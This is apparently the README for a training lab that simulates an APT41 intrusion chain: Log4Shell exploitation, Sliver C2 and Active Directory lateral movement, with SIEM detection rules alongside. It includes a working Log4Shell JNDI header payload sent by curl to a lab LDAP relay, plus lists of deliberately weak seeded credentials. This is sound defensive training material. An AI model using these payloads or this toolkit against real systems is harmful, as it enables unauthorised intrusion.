# DragonRx Lab — APT41 Attack Simulation

Full-stack CTI lab that simulates APT41 Operation DragonRx: Log4Shell initial access, Sliver C2, Active Directory lateral movement, and dual-layer detection (Wazuh + Zeek + Elastic).

Companion to the Medium article series: **[Operation DragonRx — Simulating APT41](https://medium.com/@1200km)**

---

## Stack

| Layer | Components |
|-------|-----------|
| **Attack** | Kali Linux · Sliver C2 v1.7.3 · marshalsec JNDI relay |
| **Target** | Log4Shell-vulnerable Spring app (CVE-2021-44228) · Windows Server 2019 AD · Windows 10 workstation |
| **Detection** | Wazuh 4.7.0 · Elasticsearch 8.11 · Kibana · Zeek 6.2.1 · Sysmon |
| **Orchestration** | Docker Compose · Vagrant (VirtualBox) · Ansible |

**Networks:**
- `10.0.0.0/24` — attacker-side (Kali, Sliver C2, JNDI server)
- `192.168.10.0/24` — target-side (AD domain, workstations, SIEM)

---

## Quick Start

### Docker-only (Linux containers, no Windows VMs)

```bash
git clone https://github.com/anpa1200/dragonrx-lab
cd dragonrx-lab
docker compose up -d

# Install custom Wazuh detection rules
until docker exec dragonrx_wazuh pgrep wazuh-analysisd >/dev/null 2>&1; do sleep 5; done
docker cp siem/wazuh/rules/dragonrx_rules.xml dragonrx_wazuh:/var/ossec/etc/rules/
docker exec dragonrx_wazuh /var/ossec/bin/wazuh-control restart
```

### Full deployment (Docker + Windows VMs + Ansible)

```bash
# One script — equivalent to all make targets in sequence
bash scripts/deploy.sh

# Options:
bash scripts/deploy.sh --skip-vms       # reuse already-running VMs
bash scripts/deploy.sh --skip-ansible   # skip Ansible reprovisioning
bash scripts/deploy.sh --no-test        # skip validation suite
```

### Makefile shortcuts

```bash
make up       # full deploy (Docker + Vagrant + Ansible)
make down     # stop everything, preserve volumes
make reset    # destroy all state (volumes + VMs)
make attack   # run attack scenario from Kali
make shell    # drop into Kali container
make status   # show container + VM state
make test     # run Ansible validation suite
```

---

## Access Points

| Service | URL / Command |
|---------|--------------|
| Kibana SIEM | http://localhost:5601 |
| Kali shell | `docker exec -it dragonrx_kali /bin/bash` |
| Sliver C2 | `docker exec -it dragonrx_c2 sliver` |
| Log4Shell target | `http://10.0.0.100:8080/` (header: `X-Api-Version`) |
| JNDI LDAP relay | `ldap://10.0.0.20:1389` |

---

## Prerequisites

| Requirement | Version |
|-------------|---------|
| Docker + Compose plugin | ≥ 24 |
| Vagrant | ≥ 2.3 |
| VirtualBox | ≥ 7.0 |
| Ansible | ≥ 9 |
| Python pywinrm | `pip3 install pywinrm` |
| Vagrant plugins | `vagrant plugin install vagrant-reload vagrant-hostmanager` |
| Vagrant boxes | `StefanScherer/windows_2019`, `StefanScherer/windows_10` (~8 GB each) |

---

## Target Network

```
10.0.0.100   WEB01   Log4Shell app (CVE-2021-44228)   Port 8080 (HTTP)
10.0.0.20    jndi    Marshalsec LDAP relay             Port 1389 (LDAP)
10.0.0.10    c2      Sliver C2                         Port 31337
192.168.10.10  DC01   Windows Server 2019 AD            novatech.local
192.168.10.20  FS01   Windows Server 2019               Research + Manufacturing shares
192.168.10.50  WS01   Windows 10 (jsmith)               Domain-joined workstation
```

**Pre-seeded credentials (from Ansible provisioning):**
```
svc_ldap   / NovaTech2021!        (in app env — to discover)
jsmith     / Research#2024        (domain user, local admin on WS01)
svc_backup / Backup_Svc99!       (Kerberoastable)
Administrator / NovaTech_Admin2024!  (Domain Admin)
```

---

## Fire the Exploit (after `docker compose up`)

```bash
# 1. Confirm JNDI callback (no code execution)
curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'

# 2. Check JNDI server received the callback
docker logs dragonrx_jndi 2>&1 | tail -3
# Expected: "Send LDAP reference result for test redirecting to http://10.0.0.20:8080/Exploit.class"

# 3. Kibana — search for Wazuh alert
# Index: wazuh-alerts-* | rule.id: 100110
```

---

## Repository Layout

```
dragonrx-lab/
├── Makefile                    # make up / test / attack / shell / down / reset
├── Vagrantfile                 # DC01 (WS2019), FS01 (WS2019), WS01 (Win10)
├── docker-compose.yml          # 8 Linux containers, two named subnets
├── scripts/
│   ├── deploy.sh               # one-script full deployment
│   ├── setup_routing.sh        # iptables bridge: Docker ↔ VirtualBox
│   └── fix_vboxdrv.sh          # rebuild VBoxDRV DKMS module if needed
├── ansible/                    # provisioning playbooks + roles
├── c2/
│   └── Dockerfile.sliver       # Sliver v1.7.3 from GitHub releases
├── jndi/
│   ├── Dockerfile.jndi         # eclipse-temurin:11 + Maven-built marshalsec
│   └── start.sh                # launch payload HTTP server + LDAP relay
├── siem/
│   ├── wazuh/rules/dragonrx_rules.xml   # 8 custom detection rules (100110–100170)
│   ├── zeek/local.zeek                  # Log4Shell JNDI + DNS tunnel heuristic
│   └── sysmon/sysmonconfig.xml          # EID 1,3,7,10,11,22
└── targets/
    └── web01/Dockerfile.log4shell       # reference only — compose uses pre-built image
```

---

## License

MIT — use freely for education, research, and defensive security training.
